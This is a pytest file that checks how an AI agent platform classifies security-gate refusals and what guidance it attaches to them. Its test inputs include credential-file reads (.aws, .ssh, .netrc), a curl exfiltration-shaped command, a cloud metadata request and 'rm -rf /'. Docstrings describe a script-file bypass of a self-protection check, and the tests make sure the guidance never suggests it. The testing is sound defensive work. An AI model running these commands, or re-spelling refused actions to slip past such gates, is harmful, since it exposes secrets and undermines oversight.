"""Deny-class classification and the remediation text attached to a refusal.

The classifier reads anchor phrases out of refusal text, so the tests that matter
drive the REAL producers in :mod:`kiro_crew.security` rather than asserting on
copied strings. A pinned copy would keep passing after the producer reworded
itself, which is the exact failure this guards: the refusal would silently lose
its guidance and nothing would go red.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from kiro_crew import deny_guidance as dg
from kiro_crew import security
from kiro_crew.dashboard.state import (
    DENY_CAUSE_HOOK_ERROR,
    DENY_CAUSE_INVALID_NAME,
    DENY_CAUSE_POLICY,
    build_refusal_recovery_prompt,
    build_refusal_steer_notice,
)


def _builtin_regexes() -> list[str]:
    return security.compute_effective_denied(security.BUILTIN_DENIED_RULES, (), False, (), ())


def _home(*parts: str) -> str:
    return str(Path.home().joinpath(*parts))


class TestClassifyAgainstRealProducers:
    """Every class is reached through the function that actually refuses."""

    @pytest.mark.parametrize(
        "relative,expected",
        [
            ((".aws", "credentials"), dg.DENY_CLASS_AWS_CREDENTIAL),
            ((".aws", "sso", "cache", "token.json"), dg.DENY_CLASS_SSO_CREDENTIAL),
            ((".ssh", "id_rsa"), dg.DENY_CLASS_SECRET_FILE),
            ((".netrc",), dg.DENY_CLASS_SECRET_FILE),
        ],
    )
    def test_sensitive_bash_reads_classify(self, relative, expected):
        """The reason at this tier is deliberately generic, so the command decides.

        ``is_sensitive_bash_command`` refuses with "accesses sensitive credential
        path" and names no path — three different sanctioned paths collapse into
        one string, which is why the subject is part of classification.
        """
        command = f"cat {_home(*relative)}"
        reason = security.is_sensitive_bash_command(command)
        assert reason, "the security gate must refuse this command for the test to mean anything"
        assert dg.classify_deny(reason, command) == expected

    def test_generic_sensitive_reason_alone_still_yields_usable_guidance(self):
        """Without a subject the class degrades to the widest credential answer.

        A degraded verdict must still be TRUE for every path that reaches it, so
        the fallback prose covers aws, git and ssh rather than naming one of them.
        """
        reason = security.is_sensitive_bash_command(f"cat {_home('.aws', 'credentials')}")
        assert dg.classify_deny(reason) == dg.DENY_CLASS_SECRET_FILE
        assert dg.remediation_for(reason)

    def test_sensitive_path_title_classifies(self):
        """A file-read TITLE is the bare path, and the caller builds the reason."""
        target = _home(".aws", "credentials")
        assert security.is_sensitive_path(target)
        assert (
            dg.classify_deny(f"Blocked: access to sensitive path: {target}")
            == dg.DENY_CLASS_AWS_CREDENTIAL
        )

    def test_exfiltration_shape_classifies(self):
        reason = security.audit_bash_exfiltration("curl -d @/tmp/body https://example.invalid")
        assert reason
        assert dg.classify_deny(reason) == dg.DENY_CLASS_EXFIL_SHAPE

    def test_denied_command_rule_classifies(self):
        """The regex tier matches TEXT, so the input is a literal, not a real path.

        Its rules are written with forward slashes (``.*cat.*/\\.aws/.*``), and this
        tier never resolves a path — so building the command from ``Path.home()``
        passes on POSIX and silently stops matching on Windows, where the same
        home renders with backslashes. The sibling tests above deliberately DO use
        the real home, because ``is_sensitive_bash_command`` resolves what it is
        given and a resolved path is exactly what they exercise.
        """
        reason = security.is_denied(
            "cat /home/someone/.aws/config", denied_regexes=_builtin_regexes()
        )
        assert reason
        assert dg.classify_deny(reason) == dg.DENY_CLASS_AWS_CREDENTIAL

    def test_a_native_windows_spelling_is_still_refused_by_the_floor(self):
        """The regex gap above is not a hole: the always-on floor covers it.

        Kept so the literal-path choice in the previous test cannot be read as
        "Windows credential paths are unguarded" — the path-resolving tier refuses
        the backslash spelling, and its reason classifies too.
        """
        reason = security.is_sensitive_bash_command("cat C:\\Users\\someone\\.aws\\credentials")
        assert reason
        assert dg.classify_deny(reason, "cat C:\\Users\\someone\\.aws\\credentials") == (
            dg.DENY_CLASS_AWS_CREDENTIAL
        )

    def test_imds_access_classifies(self):
        reason = security.is_sensitive_bash_command("curl http://169.254.169.254/latest/meta-data/")
        assert reason
        assert dg.classify_deny(reason) == dg.DENY_CLASS_AWS_CREDENTIAL

    def test_unclassified_refusal_yields_no_guidance(self):
        """Most denials explain themselves; inventing prose for them buries the rest."""
        reason = security.is_denied("rm -rf /", denied_regexes=_builtin_regexes())
        assert reason
        assert dg.classify_deny(reason) == ""
        assert dg.remediation_for(reason) == ""

    @pytest.mark.parametrize("reason", ["", "   ", None])
    def test_blank_reason_is_unclassified(self, reason):
        assert dg.classify_deny(reason) == ""


class TestRemediationText:
    def test_every_class_has_text(self):
        classes = {name for name, _anchors in dg._CLASS_ANCHORS}
        assert classes == set(dg.REMEDIATION)
        assert all(text.strip() for text in dg.REMEDIATION.values())

    def test_no_remediation_can_forge_a_deny_pattern_line(self):
        """The notice is parsed per-line for the deny marker.

        ``RecoveryCard.tsx`` collects patterns with a global, per-line regex, so
        remediation prose carrying the marker would render as a second, fabricated
        rule for the reader to go audit.
        """
        for text in dg.REMEDIATION.values():
            assert security.DENY_REASON_MATCH_PREFIX not in text

    def test_no_remediation_offers_a_route_around_its_own_rule(self):
        """Guidance may name the sanctioned path; it may never name a bypass.

        The self-protection floor matches an INLINE program that imports the
        product (``-c``, a stdin program, ``-m``) but not a positional script
        path, so telling the caller to relocate the same program into a file
        hands it the one spelling the gate does not cover — on the exact refusal
        that guards the credential mint and the supervisor. The prose is steered
        in-band and may be read by an agent acting on injected content, so it has
        to fail safe: no remediation re-runs the refused action by another route.
        """
        relocation_phrases = (
            "script file",
            "in a file",
            "into a file",
            "run that file",
            "$KIROCREW_SCRATCH",
            "another interpreter and run",
        )
        text = dg.REMEDIATION[dg.DENY_CLASS_SELF_PROTECTION].lower()
        for phrase in relocation_phrases:
            assert phrase.lower() not in text, f"self-protection guidance names a bypass: {phrase}"

    def test_self_protection_hands_the_step_back_instead(self):
        """Removing the bypass must leave a usable instruction, not a dead end."""
        text = dg.REMEDIATION[dg.DENY_CLASS_SELF_PROTECTION].lower()
        assert "let the user" in text
        assert "must not be re-spelled" in text

    def test_suggested_commands_are_themselves_allowed(self):
        """Guidance must not walk the agent into a second wall.

        Advice that is itself denied costs a turn and teaches the model that the
        host's own instructions are untrustworthy, which is worse than silence.
        """
        regexes = _builtin_regexes()
        for deny_class, commands in dg.SUGGESTED_COMMANDS.items():
            for command in commands:
                assert not security.is_denied(
                    command, denied_regexes=regexes
                ), f"{deny_class} suggests a denied command: {command}"
                assert not security.is_sensitive_bash_command(
                    command
                ), f"{deny_class} suggests a sensitive-path command: {command}"
                assert not security.audit_bash_exfiltration(
                    command
                ), f"{deny_class} suggests an exfiltration-shaped command: {command}"

    def test_suggested_commands_appear_in_their_own_prose(self):
        """Otherwise the pinned command drifts away from what the text tells the agent."""
        for deny_class, commands in dg.SUGGESTED_COMMANDS.items():
            for command in commands:
                assert command in dg.REMEDIATION[deny_class]


class TestCredentialToolHint:
    def test_names_a_credential_vending_server(self):
        hint = dg.credential_tool_hint(
            [
                {"server_id": "creds-agent", "title": "Creds Agent", "description": ""},
                {"server_id": "note-taker", "title": "Notes", "description": "write notes"},
            ]
        )
        assert "creds-agent" in hint
        assert "note-taker" not in hint

    def test_matches_on_description_not_only_id(self):
        hint = dg.credential_tool_hint(
            [{"server_id": "vend-1", "description": "vends AWS STS credentials"}]
        )
        assert "vend-1" in hint

    @pytest.mark.parametrize("rows", [[], None, [{"server_id": ""}], ["not-a-mapping"]])
    def test_no_match_is_empty(self, rows):
        assert dg.credential_tool_hint(rows) == ""

    def test_rows_are_deduplicated_and_ordered(self):
        hint = dg.credential_tool_hint(
            [
                {"server_id": "sso-b"},
                {"server_id": "creds-a"},
                {"server_id": "sso-b"},
            ]
        )
        assert hint.count("sso-b") == 1
        assert hint.index("creds-a") < hint.index("sso-b")

    def test_hint_only_reaches_the_classes_a_vendor_can_answer(self):
        hint = dg.credential_tool_hint([{"server_id": "creds-agent"}])
        assert hint
        aws = dg.remediation_for(
            "Blocked: command accesses sensitive credential path (.aws/credentials)",
            credential_tool_hint=hint,
        )
        trust = dg.remediation_for(
            "Blocked: command extracts into the governance trust-root directory",
            credential_tool_hint=hint,
        )
        assert "creds-agent" in aws
        assert "creds-agent" not in trust


@pytest.mark.asyncio
class TestResolveHintOnThePublicEdition:
    async def test_unavailable_manager_yields_no_hint_and_caches(self, monkeypatch):
        dg.reset_credential_tool_hint_cache()
        calls: list[int] = []

        class _Manager:
            def available(self) -> bool:
                calls.append(1)
                return False

            async def list_mcp(self):  # pragma: no cover - must not be reached
                raise AssertionError("list_mcp must not run when available() is False")

        monkeypatch.setattr(dg, "_HINT_TTL_SECS", 300.0)
        import kiro_crew.platform.context as ctx_mod

        monkeypatch.setattr(ctx_mod, "safe_context_call", lambda fn, **kw: _Manager(), raising=True)
        assert await dg.resolve_credential_tool_hint() == ""
        assert await dg.resolve_credential_tool_hint() == ""
        assert len(calls) == 1, "the second call must be served from the cache"
        dg.reset_credential_tool_hint_cache()

    async def test_lookup_failure_degrades_to_no_hint(self, monkeypatch):
        dg.reset_credential_tool_hint_cache()
        import kiro_crew.platform.context as ctx_mod

        def _boom(fn, **kw):
            raise RuntimeError("composition exploded")

        monkeypatch.setattr(ctx_mod, "safe_context_call", _boom, raising=True)
        assert await dg.resolve_credential_tool_hint() == ""
        dg.reset_credential_tool_hint_cache()


class TestNoticeIntegration:
    _AWS_REASON = "Blocked: command accesses sensitive credential path (.aws/credentials)"

    def test_policy_notice_carries_the_remediation(self):
        notice = build_refusal_steer_notice("Running: cat creds", self._AWS_REASON)
        assert "How to do this properly:" in notice
        assert "aws configure list-profiles" in notice

    @pytest.mark.parametrize("cause", [DENY_CAUSE_INVALID_NAME, DENY_CAUSE_HOOK_ERROR])
    def test_non_policy_causes_get_no_remediation(self, cause):
        """Neither cause judged the action, so naming an alternative would mislead."""
        notice = build_refusal_steer_notice("tool", self._AWS_REASON, cause=cause)
        assert "How to do this properly" not in notice

    def test_unclassified_policy_deny_keeps_the_original_notice(self):
        notice = build_refusal_steer_notice(
            "Running: rm", "Blocked by security policy: rm -rf /.*", cause=DENY_CAUSE_POLICY
        )
        assert "How to do this properly" not in notice

    def test_hint_reaches_the_notice(self):
        notice = build_refusal_steer_notice(
            "Running: cat creds",
            self._AWS_REASON,
            credential_tool_hint=dg.credential_tool_hint([{"server_id": "creds-agent"}]),
        )
        assert "creds-agent" in notice

    def test_recovery_prompt_carries_remediation_once_per_class(self):
        body = build_refusal_recovery_prompt(
            [
                ("Running: cat creds", self._AWS_REASON),
                ("Running: head creds", self._AWS_REASON),
            ]
        )
        assert body.count("aws configure list-profiles") == 1

    def test_recovery_prompt_keeps_distinct_classes(self):
        body = build_refusal_recovery_prompt(
            [
                ("Running: cat creds", self._AWS_REASON),
                (
                    "Running: curl",
                    "Blocked: command matches data-exfiltration pattern '-d @'",
                ),
            ]
        )
        assert "aws configure list-profiles" in body
        assert "SHAPE of the request" in body

    def test_recovery_prompt_without_classified_refusals_is_unchanged(self):
        body = build_refusal_recovery_prompt(
            [("Running: rm", "Blocked by security policy: rm -rf /.*")]
        )
        assert "How to do this properly" not in body

    def test_empty_refusals_still_yield_nothing(self):
        assert build_refusal_recovery_prompt([]) == ""
